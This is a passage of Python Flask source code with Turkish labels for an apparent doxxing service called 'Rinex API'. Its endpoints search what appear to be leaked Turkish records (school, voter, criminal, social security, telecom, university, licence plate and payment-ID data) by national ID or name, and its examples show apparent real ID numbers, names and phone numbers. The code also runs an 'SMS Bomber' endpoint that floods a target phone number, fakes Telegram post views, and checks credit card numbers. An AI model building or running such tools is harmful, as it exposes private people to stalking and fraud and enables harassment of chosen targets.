                'message': 'Geçersiz Telegram mesaj linki'
            }
        
        chat_identifier = match.group(1)
        message_id = int(match.group(2))
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8"
        }
        
        response = requests.get(post_link, headers=headers, timeout=10)
        
        if response.status_code == 200:
            content = response.text
            import re
            
            title_match = re.search(r'<meta property="og:title" content="(.*?)"', content)
            title = title_match.group(1) if title_match else ""
            
            desc_match = re.search(r'<meta property="og:description" content="(.*?)"', content)
            description = desc_match.group(1) if desc_match else ""
            
            image_match = re.search(r'<meta property="og:image" content="(.*?)"', content)
            image = image_match.group(1) if image_match else ""
            
            view_match = re.search(r'(\d+[\.,]?\d*)\s*(?:views?|görüntülenme)', content, re.IGNORECASE)
            views = view_match.group(1) if view_match else "0"
            
            return {
                'success': True,
                'chat_identifier': chat_identifier,
                'message_id': message_id,
                'title': title,
                'description': description,
                'image': image,
                'views': views,
                'link': post_link,
                'type': 'Post'
            }
        else:
            return {
                'success': False,
                'message': 'Post bulunamadı veya erişilebilir değil',
                'link': post_link
            }
    except Exception as e:
        return {'success': False, 'message': f'Hata: {str(e)}'}

def telegram_post_view_simulate(post_link, count=1):
    results = []
    success_count = 0
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
    ]
    
    for i in range(count):
        try:
            headers = {
                "User-Agent": choice(user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Referer": "https://t.me/",
                "Dnt": "1",
                "Sec-Gpc": "1"
            }
            
            response = requests.get(post_link, headers=headers, timeout=10)
            
            if response.status_code == 200:
                success_count += 1
                results.append({
                    'attempt': i + 1,
                    'status': 'success',
                    'user_agent': headers["User-Agent"][:50] + "..."
                })
            else:
                results.append({
                    'attempt': i + 1,
                    'status': 'failed',
                    'status_code': response.status_code
                })
            
            time.sleep(0.5)
        except Exception as e:
            results.append({
                'attempt': i + 1,
                'status': 'error',
                'message': str(e)
            })
    
    return {
        'total': count,
        'success': success_count,
        'failed': count - success_count,
        'results': results,
        'link': post_link
    }

# ==================== ANA SAYFA (GIF'Lİ) ====================

@app.route('/', methods=['GET'])
def ana_sayfa():
    """Ana sayfa - GIF ve API bilgileri"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Rinex API</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                background: linear-gradient(135deg, #0a0a0a, #1a1a2e, #16213e);
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                overflow-x: hidden;
            }
            .container {
                text-align: center;
                padding: 20px;
                max-width: 800px;
                width: 100%;
            }
            .gif-container {
                width: 100%;
                max-width: 400px;
                margin: 0 auto 30px auto;
                border-radius: 20px;
                overflow: hidden;
                box-shadow: 0 0 40px rgba(100, 100, 255, 0.3);
                border: 2px solid rgba(100, 100, 255, 0.2);
                animation: glow 3s ease-in-out infinite;
            }
            .gif-container img {
                width: 100%;
                height: auto;
                display: block;
            }
            @keyframes glow {
                0%, 100% { box-shadow: 0 0 40px rgba(100, 100, 255, 0.3); }
                50% { box-shadow: 0 0 80px rgba(100, 100, 255, 0.6); }
            }
            .title {
                color: #fff;
                font-size: 2.5em;
                margin: 10px 0;
                font-weight: 700;
                background: linear-gradient(90deg, #00d2ff, #3a7bd5, #00d2ff);
                background-size: 300% 300%;
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                animation: gradient 4s ease-in-out infinite;
            }
            @keyframes gradient {
                0%, 100% { background-position: 0% 50%; }
                50% { background-position: 100% 50%; }
            }
            .subtitle {
                color: #8888aa;
                font-size: 1.1em;
                margin: 5px 0 20px 0;
                letter-spacing: 2px;
            }
            .status {
                display: inline-block;
                background: rgba(0, 255, 100, 0.15);
                color: #00ff88;
                padding: 8px 20px;
                border-radius: 30px;
                font-size: 0.9em;
                border: 1px solid rgba(0, 255, 100, 0.2);
                margin-bottom: 20px;
                animation: pulse 2s ease-in-out infinite;
            }
            @keyframes pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.6; }
            }
            .endpoints {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 15px;
                margin-top: 25px;
            }
            .endpoint-card {
                background: rgba(255, 255, 255, 0.05);
                backdrop-filter: blur(10px);
                border-radius: 15px;
                padding: 18px;
                border: 1px solid rgba(255, 255, 255, 0.08);
                transition: all 0.3s ease;
                text-align: left;
            }
            .endpoint-card:hover {
                transform: translateY(-5px);
                background: rgba(255, 255, 255, 0.1);
                border-color: rgba(100, 100, 255, 0.3);
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            }
            .endpoint-card .name {
                color: #00d2ff;
                font-size: 0.9em;
                font-weight: 600;
                margin-bottom: 5px;
            }
            .endpoint-card .path {
                color: #aaaacc;
                font-size: 0.7em;
                font-family: monospace;
                word-break: break-all;
                background: rgba(0, 0, 0, 0.3);
                padding: 4px 8px;
                border-radius: 5px;
                display: inline-block;
            }
            .endpoint-card .desc {
                color: #8888aa;
                font-size: 0.75em;
                margin-top: 5px;
            }
            .footer {
                color: #555577;
                font-size: 0.8em;
                margin-top: 30px;
                border-top: 1px solid rgba(255, 255, 255, 0.05);
                padding-top: 20px;
            }
            .footer a {
                color: #00d2ff;
                text-decoration: none;
            }
            .footer a:hover {
                text-decoration: underline;
            }
            @media (max-width: 600px) {
                .title { font-size: 1.8em; }
                .endpoints { grid-template-columns: 1fr; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="gif-container">
                <img src="https://tenor.com/i83GbmmKdwe.gif" alt="Rinex API" />
            </div>
            <div class="title">@rinexdestek</div>
            <div class="subtitle">⚡ API GATEWAY</div>
            <div class="status">🟢 Tüm sistemler çalışıyor</div>
            
            <div class="endpoints">
                <div class="endpoint-card">
                    <div class="name">📚 E-Okul</div>
                    <div class="path">/eokul/api?tc=11060326504</div>
                    <div class="desc">TC, Ad, Soyad ile sorgulama</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">🗳️ Seçmen</div>
                    <div class="path">/secmen/api?tc=18445070762</div>
                    <div class="desc">TC, Ad, Soyad, İl ile sorgulama</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">🚗 Plaka</div>
                    <div class="path">/plaka/api?plaka=41HU096</div>
                    <div class="desc">Plaka ↔ Ad-Soyad dönüşümü</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">💳 Papara</div>
                    <div class="path">/papara/api?papara_id=1354693996</div>
                    <div class="desc">Papara ID ↔ Ad-Soyad dönüşümü</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">📋 Sicil</div>
                    <div class="path">/sicil/api?tc=19402658634</div>
                    <div class="desc">TC, Ad, Soyad ile sorgulama</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">🌐 TurkNet</div>
                    <div class="path">/turknet/api?ad=Egemen Kutay</div>
                    <div class="desc">Ad veya Telefon ile sorgulama</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">🏛️ SGK</div>
                    <div class="path">/sgk/api?tc=10001337050</div>
                    <div class="desc">TC, Ad, Soyad ile sorgulama</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">🎓 Üniversite</div>
                    <div class="path">/universite/api?tc=98097940397</div>
                    <div class="desc">TC, Ad-Soyad, Okul ile sorgulama</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">💣 SMS Bomber</div>
                    <div class="path">/smsbomber/bombala?telefon=5551234567</div>
                    <div class="desc">SMS bombası gönderir (0 olmadan)</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">💳 CC Doğrulama</div>
                    <div class="path">/cc/luhn?kart=4111111111111111</div>
                    <div class="desc">Kredi kartı doğrulama (Luhn)</div>
                </div>
                <div class="endpoint-card">
                    <div class="name">📱 Telegram</div>
                    <div class="path">/telegram/user?username=@username</div>
                    <div class="desc">Token gerektirmez - Public bilgiler</div>
                </div>
            </div>
            
            <div class="footer">
                <p>🔗 Ana API: <a href="https://eokulsorguapi.onrender.com">eokulsorguapi.onrender.com</a></p>
                <p>📌 Tüm sorgular JSON formatında döner</p>
            </div>
        </div>
    </body>
    </html>
    '''

# ==================== E-OKUL API ====================

@app.route('/eokul', methods=['GET'])
def eokul_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'E-Okul Sorgulama API',
        'toplam_kayit': len(eokul_veriler),
        'kullanım': {
            'tc': '/eokul/api?tc=11060326504',
            'ad': '/eokul/api?ad=gazel',
            'soyad': '/eokul/api?soyad=atila'
        }
    })

@app.route('/eokul/api', methods=['GET'])
def eokul_sorgula():
    tc = request.args.get('tc', '').strip()
    ad = request.args.get('ad', '').strip()
    soyad = request.args.get('soyad', '').strip()
    
    if tc:
        if tc in eokul_dict:
            return jsonify(eokul_dict[tc])
        return jsonify({'durum': 'hata', 'mesaj': f'{tc} TC bulunamadı'}), 404
    
    if ad and soyad:
        sonuc = [k for k in eokul_veriler if ad.upper() in k['ad'].upper() and soyad.upper() in k['soyad'].upper()]
        return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
    
    if ad:
        sonuc = [k for k in eokul_veriler if ad.upper() in k['ad'].upper()]
        return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
    
    if soyad:
        sonuc = [k for k in eokul_veriler if soyad.upper() in k['soyad'].upper()]
        return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
    
    return jsonify({'durum': 'hata', 'mesaj': 'Lütfen tc, ad veya soyad girin'}), 400

# ==================== SEÇMEN API ====================

@app.route('/secmen', methods=['GET'])
def secmen_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Seçmen Sorgulama API',
        'toplam_kayit': len(secmen_veriler),
        'kullanım': {
            'tc': '/secmen/api?tc=18445070762',
            'ad': '/secmen/api?ad=ahmet',
            'soyad': '/secmen/api?soyad=aydoğdu',
            'il': '/secmen/api?il=adana'
        }
    })

@app.route('/secmen/api', methods=['GET'])
def secmen_sorgula():
    tc = request.args.get('tc', '').strip()
    ad = request.args.get('ad', '').strip()
    soyad = request.args.get('soyad', '').strip()
    il = request.args.get('il', '').strip()
    adres = request.args.get('adres', '').strip()
    
    if tc:
        if tc in secmen_dict:
            return jsonify(secmen_dict[tc])
        return jsonify({'durum': 'hata', 'mesaj': f'{tc} TC bulunamadı'}), 404
    
    sonuc = secmen_veriler
    
    if ad:
        sonuc = [k for k in sonuc if ad.upper() in k['ad'].upper()]
    if soyad:
        sonuc = [k for k in sonuc if soyad.upper() in k['soyad'].upper()]
    if il:
        sonuc = [k for k in sonuc if il.upper() in k['il'].upper()]
    if adres:
        sonuc = [k for k in sonuc if adres.upper() in k['adres'].upper()]
    
    if sonuc:
        return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
    return jsonify({'durum': 'hata', 'mesaj': 'Kayıt bulunamadı'}), 404

# ==================== PLAKA API ====================

@app.route('/plaka', methods=['GET'])
def plaka_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Plaka Sorgulama API - Plaka ↔ Ad-Soyad Dönüşümü',
        'toplam_kayit': len(plaka_veriler),
        'benzersiz_plaka': len(plaka_plaka_dict),
        'benzersiz_kisi': len(plaka_isim_dict),
        'kullanım': {
            'plaka_ile': '/plaka/api?plaka=41HU096 → Ad-Soyad',
            'isim_ile': '/plaka/api?ad_soyad=CEVDET ALKIŞ → Plaka'
        }
    })

@app.route('/plaka/api', methods=['GET'])
def plaka_sorgula():
    plaka = request.args.get('plaka', '').strip().upper()
    ad_soyad = request.args.get('ad_soyad', '').strip().upper()
    
    if plaka:
        if plaka in plaka_plaka_dict:
            return jsonify({
                'durum': 'başarılı',
                'plaka': plaka,
                'kisi_sayisi': len(plaka_plaka_dict[plaka]),
                'kisiler': plaka_plaka_dict[plaka]
            })
        return jsonify({'durum': 'hata', 'mesaj': f'{plaka} plakası bulunamadı'}), 404
    
    if ad_soyad:
        if ad_soyad in plaka_isim_dict:
            return jsonify({
                'durum': 'başarılı',
                'ad_soyad': ad_soyad,
                'plaka_sayisi': len(plaka_isim_dict[ad_soyad]),
                'plakalar': plaka_isim_dict[ad_soyad]
            })
        
        sonuc = []
        for isim, plakalar in plaka_isim_dict.items():
            if ad_soyad in isim.upper():
                sonuc.append({'ad_soyad': isim, 'plakalar': plakalar})
        
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{ad_soyad} bulunamadı'}), 404
    
    return jsonify({'durum': 'hata', 'mesaj': 'Plaka veya ad_soyad girin'}), 400

# ==================== PAPARA API ====================

@app.route('/papara', methods=['GET'])
def papara_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Papara Sorgulama API - Papara ID ↔ Ad-Soyad Dönüşümü',
        'toplam_kayit': len(papara_veriler),
        'benzersiz_id': len(papara_id_dict),
        'benzersiz_kisi': len(papara_isim_dict),
        'kullanım': {
            'papara_id_ile': '/papara/api?papara_id=1354693996 → Ad-Soyad',
            'isim_ile': '/papara/api?ad_soyad=MEHMET TEKER → Papara ID'
        }
    })

@app.route('/papara/api', methods=['GET'])
def papara_sorgula():
    papara_id = request.args.get('papara_id', '').strip()
    ad_soyad = request.args.get('ad_soyad', '').strip().upper()
    
    if papara_id:
        if papara_id in papara_id_dict:
            return jsonify({
                'durum': 'başarılı',
                'papara_id': papara_id,
                'ad_soyad': papara_id_dict[papara_id]
            })
        return jsonify({'durum': 'hata', 'mesaj': f'{papara_id} Papara ID bulunamadı'}), 404
    
    if ad_soyad:
        if ad_soyad in papara_isim_dict:
            return jsonify({
                'durum': 'başarılı',
                'ad_soyad': ad_soyad,
                'papara_id_sayisi': len(papara_isim_dict[ad_soyad]),
                'papara_idler': papara_isim_dict[ad_soyad]
            })
        
        sonuc = []
        for isim, idler in papara_isim_dict.items():
            if ad_soyad in isim.upper():
                sonuc.append({'ad_soyad': isim, 'papara_idler': idler})
        
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{ad_soyad} bulunamadı'}), 404
    
    return jsonify({'durum': 'hata', 'mesaj': 'Papara ID veya ad_soyad girin'}), 400

# ==================== SİCİL API ====================

@app.route('/sicil', methods=['GET'])
def sicil_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Sicil Sorgulama API',
        'toplam_kayit': len(sicil_veriler),
        'benzersiz_tc': len(sicil_tc_dict),
        'benzersiz_ad_soyad': len(sicil_ad_soyad_dict),
        'kullanım': {
            'tc': '/sicil/api?tc=19402658634',
            'ad': '/sicil/api?ad=BERKAY',
            'soyad': '/sicil/api?soyad=GENÇTÜRK'
        }
    })

@app.route('/sicil/api', methods=['GET'])
def sicil_sorgula():
    tc = request.args.get('tc', '').strip()
    ad = request.args.get('ad', '').strip()
    soyad = request.args.get('soyad', '').strip()
    
    if tc:
        tc_temiz = re.sub(r'\s', '', tc)
        for key in sicil_tc_dict:
            key_temiz = re.sub(r'\s', '', key)
            if tc_temiz == key_temiz:
                return jsonify(sicil_tc_dict[key])
        return jsonify({'durum': 'hata', 'mesaj': f'{tc} TC bulunamadı'}), 404
    
    if ad and soyad:
        ad_soyad = f"{ad} {soyad}".strip().upper()
        sonuc = []
        for anahtar, kayitlar in sicil_ad_soyad_dict.items():
            if ad_soyad in anahtar.upper():
                sonuc.extend(kayitlar)
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{ad} {soyad} bulunamadı'}), 404
    
    if ad:
        sonuc = []
        for anahtar, kayitlar in sicil_ad_soyad_dict.items():
            if ad.upper() in anahtar.upper():
                sonuc.extend(kayitlar)
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{ad} bulunamadı'}), 404
    
    if soyad:
        sonuc = []
        for anahtar, kayitlar in sicil_ad_soyad_dict.items():
            if soyad.upper() in anahtar.upper():
                sonuc.extend(kayitlar)
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{soyad} bulunamadı'}), 404
    
    return jsonify({'durum': 'hata', 'mesaj': 'Lütfen tc, ad veya soyad girin'}), 400

# ==================== TURKNET API ====================

@app.route('/turknet', methods=['GET'])
def turknet_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'TurkNet Sorgulama API',
        'toplam_kayit': len(turknet_veriler),
        'benzersiz_ad': len(turknet_ad_dict),
        'benzersiz_telefon': len(turknet_phone_dict),
        'kullanım': {
            'ad': '/turknet/api?ad=Egemen Kutay',
            'telefon': '/turknet/api?telefon=05539848500'
        }
    })

@app.route('/turknet/api', methods=['GET'])
def turknet_sorgula():
    ad = request.args.get('ad', '').strip()
    telefon = request.args.get('telefon', '').strip()
    
    if telefon:
        telefon_temiz = re.sub(r'\s', '', telefon)
        telefon_temiz = re.sub(r'\D', '', telefon_temiz)
        
        for tel, kisi in turknet_phone_dict.items():
            tel_temiz = re.sub(r'\s', '', tel)
            tel_temiz = re.sub(r'\D', '', tel_temiz)
            if telefon_temiz == tel_temiz:
                return jsonify(kisi)
        
        sonuc = []
        for kisi in turknet_veriler:
            if kisi['telefon']:
                tel_temiz = re.sub(r'\s', '', kisi['telefon'])
                tel_temiz = re.sub(r'\D', '', tel_temiz)
                if telefon_temiz in tel_temiz or tel_temiz in telefon_temiz:
                    sonuc.append(kisi)
        
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{telefon} bulunamadı'}), 404
    
    if ad:
        ad_upper = ad.upper()
        
        for name in turknet_ad_dict:
            if ad_upper == name.upper():
                return jsonify({'durum': 'başarılı', 'bulunan': len(turknet_ad_dict[name]), 'sonuc': turknet_ad_dict[name]})
        
        sonuc = []
        for name, kayitlar in turknet_ad_dict.items():
            if ad_upper in name.upper() or name.upper() in ad_upper:
                sonuc.extend(kayitlar)
        
        if not sonuc:
            for kisi in turknet_veriler:
                if kisi['adres'] and ad_upper in kisi['adres'].upper():
                    sonuc.append(kisi)
        
        if sonuc:
            benzersiz = []
            seen = set()
            for item in sonuc:
                key = f"{item.get('ad', '')}_{item.get('telefon', '')}"
                if key not in seen:
                    seen.add(key)
                    benzersiz.append(item)
            return jsonify({'durum': 'başarılı', 'bulunan': len(benzersiz), 'sonuc': benzersiz})
        return jsonify({'durum': 'hata', 'mesaj': f'{ad} bulunamadı'}), 404
    
    return jsonify({'durum': 'hata', 'mesaj': 'Lütfen ad veya telefon girin'}), 400

# ==================== SMS BOMBER API ====================

@app.route('/smsbomber', methods=['GET'])
def smsbomber_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'SMS Bomber API',
        'aciklama': 'Telefon numarasına SMS bombası gönderir',
        'kullanım': {
            'bombala': '/smsbomber/bombala?telefon=5551234567',
            'durum': '/smsbomber/durum?telefon=5551234567'
        },
        'not': 'Telefon numarası 0 olmadan, sadece rakam olarak girilir (örn: 5551234567)'
    })

@app.route('/smsbomber/bombala', methods=['GET'])
def smsbomber_bombala():
    telefon = request.args.get('telefon', '').strip()
    
    if not telefon:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Telefon numarası giriniz (0 olmadan, örn: 5551234567)',
            'ornek': '/smsbomber/bombala?telefon=5551234567'
        }), 400
    
    telefon = re.sub(r'\D', '', telefon)
    if len(telefon) < 10:
        return jsonify({'durum': 'hata', 'mesaj': 'Geçerli bir telefon numarası giriniz'}), 400
    
    if telefon.startswith('0'):
        telefon = telefon[1:]
    
    if telefon in sms_threads and sms_threads[telefon].is_alive():
        return jsonify({
            'durum': 'uyarı',
            'mesaj': 'Bu numara zaten bombalanıyor!',
            'telefon': telefon,
            'durum_kontrol': f'/smsbomber/durum?telefon={telefon}'
        })
    
    try:
        def bomba_gonder():
            sms = SendSms(telefon)
            sonuc = sms.run_all()
            sms_results[telefon] = {
                'tarih': datetime.now().isoformat(),
                'telefon': telefon,
                'toplam_servis': sonuc['total'],
                'basari': sonuc['success'],
                'basarisiz': sonuc['failed'],
                'detay': sonuc['results']
            }
        
        thread = threading.Thread(target=bomba_gonder)
        thread.daemon = True
        thread.start()
        sms_threads[telefon] = thread
        
        return jsonify({
            'durum': 'başarılı',
            'mesaj': 'SMS bombası başlatıldı!',
            'telefon': telefon,
            'durum_kontrol': f'/smsbomber/durum?telefon={telefon}'
        })
    except Exception as e:
        return jsonify({'durum': 'hata', 'mesaj': f'Başlatma hatası: {str(e)}'}), 500

@app.route('/smsbomber/durum', methods=['GET'])
def smsbomber_durum():
    telefon = request.args.get('telefon', '').strip()
    
    if not telefon:
        return jsonify({'durum': 'hata', 'mesaj': 'Telefon numarası giriniz'}), 400
    
    telefon = re.sub(r'\D', '', telefon)
    if telefon.startswith('0'):
        telefon = telefon[1:]
    
    if telefon in sms_results:
        return jsonify({
            'durum': 'başarılı',
            'telefon': telefon,
            'sonuc': sms_results[telefon]
        })
    elif telefon in sms_threads and sms_threads[telefon].is_alive():
        return jsonify({
            'durum': 'devam_ediyor',
            'mesaj': 'SMS bombası devam ediyor...',
            'telefon': telefon
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Bu numara için bomba kaydı bulunamadı',
            'telefon': telefon
        }), 404

@app.route('/smsbomber/liste', methods=['GET'])
def smsbomber_liste():
    return jsonify({
        'durum': 'başarılı',
        'toplam': len(sms_results),
        'sonuclar': sms_results
    })

# ==================== SGK API ====================

@app.route('/sgk', methods=['GET'])
def sgk_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'SGK Sorgulama API',
        'aciklama': 'TC veya Ad-Soyad ile SGK sorgulama',
        'toplam_kayit': len(sgk_veriler),
        'kullanım': {
            'tc': '/sgk/api?tc=10001337050',
            'ad_soyad': '/sgk/api?ad=ULAŞ&soyad=DEMİR',
            'ad': '/sgk/api?ad=ULAŞ',
            'soyad': '/sgk/api?soyad=DEMİR'
        }
    })

@app.route('/sgk/api', methods=['GET'])
def sgk_sorgula():
    tc = request.args.get('tc', '').strip()
    ad = request.args.get('ad', '').strip()
    soyad = request.args.get('soyad', '').strip()
    
    if tc:
        if tc in sgk_tc_dict:
            return jsonify(sgk_tc_dict[tc])
        return jsonify({
            'durum': 'hata',
            'mesaj': f'{tc} TC numarası bulunamadı',
            'tc': tc
        }), 404
    
    if ad and soyad:
        aranan = f"{ad} {soyad}".strip().upper()
        sonuc = []
        
        for anahtar, kisiler in sgk_ad_soyad_dict.items():
            if aranan in anahtar or anahtar in aranan:
                sonuc.extend(kisiler)
        
        benzersiz = []
        seen = set()
        for item in sonuc:
            if item['tc'] not in seen:
                seen.add(item['tc'])
                benzersiz.append(item)
        
        if benzersiz:
            return jsonify({
                'durum': 'başarılı',
                'aranan': f"{ad} {soyad}",
                'bulunan': len(benzersiz),
                'sonuc': benzersiz
            })
        return jsonify({
            'durum': 'hata',
            'mesaj': f'{ad} {soyad} bulunamadı',
            'aranan': f"{ad} {soyad}"
        }), 404
    
    if ad:
        sonuc = []
        ad_upper = ad.upper()
        
        for anahtar, kisiler in sgk_ad_soyad_dict.items():
            if ad_upper in anahtar:
                sonuc.extend(kisiler)
        
        benzersiz = []
        seen = set()
        for item in sonuc:
            if item['tc'] not in seen:
                seen.add(item['tc'])
                benzersiz.append(item)
        
        if benzersiz:
            return jsonify({
                'durum': 'başarılı',
                'aranan_ad': ad,
                'bulunan': len(benzersiz),
                'sonuc': benzersiz
            })
        return jsonify({
            'durum': 'hata',
            'mesaj': f'{ad} bulunamadı',
            'aranan_ad': ad
        }), 404
    
    if soyad:
        sonuc = []
        soyad_upper = soyad.upper()
        
        for anahtar, kisiler in sgk_ad_soyad_dict.items():
            if soyad_upper in anahtar:
                sonuc.extend(kisiler)
        
        benzersiz = []
        seen = set()
        for item in sonuc:
            if item['tc'] not in seen:
                seen.add(item['tc'])
                benzersiz.append(item)
        
        if benzersiz:
            return jsonify({
                'durum': 'başarılı',
                'aranan_soyad': soyad,
                'bulunan': len(benzersiz),
                'sonuc': benzersiz
            })
        return jsonify({
            'durum': 'hata',
            'mesaj': f'{soyad} bulunamadı',
            'aranan_soyad': soyad
        }), 404
    
    return jsonify({
        'durum': 'hata',
        'mesaj': 'Lütfen tc, ad veya soyad parametresi girin',
        'kullanım': {
            'tc': '/sgk/api?tc=10001337050',
            'ad_soyad': '/sgk/api?ad=ULAŞ&soyad=DEMİR',
            'ad': '/sgk/api?ad=ULAŞ',
            'soyad': '/sgk/api?soyad=DEMİR'
        }
    }), 400

# ==================== ÜNİVERSİTE API (YENİ) ====================

@app.route('/universite', methods=['GET'])
def universite_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Üniversite Sorgulama API',
        'aciklama': 'TC, Ad-Soyad veya Üniversite ile sorgulama',
        'toplam_kayit': len(universite_veriler),
        'benzersiz_tc': len(universite_tc_dict),
        'benzersiz_ad_soyad': len(universite_ad_soyad_dict),
        'benzersiz_okul': len(universite_okul_dict),
        'kullanım': {
            'tc': '/universite/api?tc=98097940397',
            'ad_soyad': '/universite/api?ad_soyad=SİMAY AKSOY',
            'universite': '/universite/api?universite=SÜLEYMAN DEMİREL ÜNİVERSİTESİ'
        }
    })

@app.route('/universite/api', methods=['GET'])
def universite_sorgula():
    tc = request.args.get('tc', '').strip()
    ad_soyad = request.args.get('ad_soyad', '').strip()
    universite = request.args.get('universite', '').strip()
    
    # 1. TC ile sorgula
    if tc:
        if tc in universite_tc_dict:
            return jsonify(universite_tc_dict[tc])
        return jsonify({
            'durum': 'hata',
            'mesaj': f'{tc} TC numarası bulunamadı',
            'tc': tc
        }), 404
    
    # 2. Ad-Soyad ile sorgula (Kısmi eşleşme)
    if ad_soyad:
        sonuc = []
        for anahtar, kisiler in universite_ad_soyad_dict.items():
            if ad_soyad.upper() in anahtar.upper() or anahtar.upper() in ad_soyad.upper():
                sonuc.extend(kisiler)
        
        if sonuc:
            benzersiz = []
            seen = set()
            for item in sonuc:
                if item['tc'] not in seen:
                    seen.add(item['tc'])
                    benzersiz.append(item)
            
            return jsonify({
                'durum': 'başarılı',
                'aranan_ad_soyad': ad_soyad,
                'bulunan': len(benzersiz),
                'sonuc': benzersiz
            })
        return jsonify({
            'durum': 'hata',
            'mesaj': f'{ad_soyad} bulunamadı',
            'aranan_ad_soyad': ad_soyad
        }), 404
    
    # 3. Üniversite ile sorgula (Kısmi eşleşme)
    if universite:
        sonuc = []
        for okul, kisiler in universite_okul_dict.items():
            if universite.upper() in okul.upper() or okul.upper() in universite.upper():
                sonuc.extend(kisiler)
        
        if sonuc:
            benzersiz = []
            seen = set()
            for item in sonuc:
                if item['tc'] not in seen:
                    seen.add(item['tc'])
                    benzersiz.append(item)
            
            return jsonify({
                'durum': 'başarılı',
                'aranan_universite': universite,
                'bulunan': len(benzersiz),
                'sonuc': benzersiz
            })
        return jsonify({
            'durum': 'hata',
            'mesaj': f'{universite} üniversitesinde kayıt bulunamadı',
            'aranan_universite': universite
        }), 404
    
    return jsonify({
        'durum': 'hata',
        'mesaj': 'Lütfen tc, ad_soyad veya universite parametresi girin',
        'kullanım': {
            'tc': '/universite/api?tc=98097940397',
            'ad_soyad': '/universite/api?ad_soyad=SİMAY AKSOY',
            'universite': '/universite/api?universite=SÜLEYMAN DEMİREL ÜNİVERSİTESİ'
        }
    }), 400

# ==================== TELEGRAM API ====================

@app.route('/telegram', methods=['GET'])
def telegram_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Telegram API - TOKEN GEREKTİRMEZ',
        'aciklama': 'Telegram public API ile bilgi toplama',
        'kullanım': {
            'kullanici_bilgi': '/telegram/user?username=@kullanici_adi',
            'post_analiz': '/telegram/post/analyze?link=https://t.me/username/123',
            'post_goruntulenme': '/telegram/post/view?link=https://t.me/username/123&count=5'
        },
        'not': 'Bu API\'ler Telegram bot token gerektirmez. Sadece public bilgileri çeker.'
    })

@app.route('/telegram/user', methods=['GET'])
def telegram_user_api():
    username = request.args.get('username', '').strip()
    
    if not username:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Kullanıcı adı giriniz (örn: @username)',
            'ornek': '/telegram/user?username=@username'
        }), 400
    
    sonuc = telegram_user_info_public(username)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'kullanici': {
                'username': sonuc.get('username'),
                'display_name': sonuc.get('display_name'),
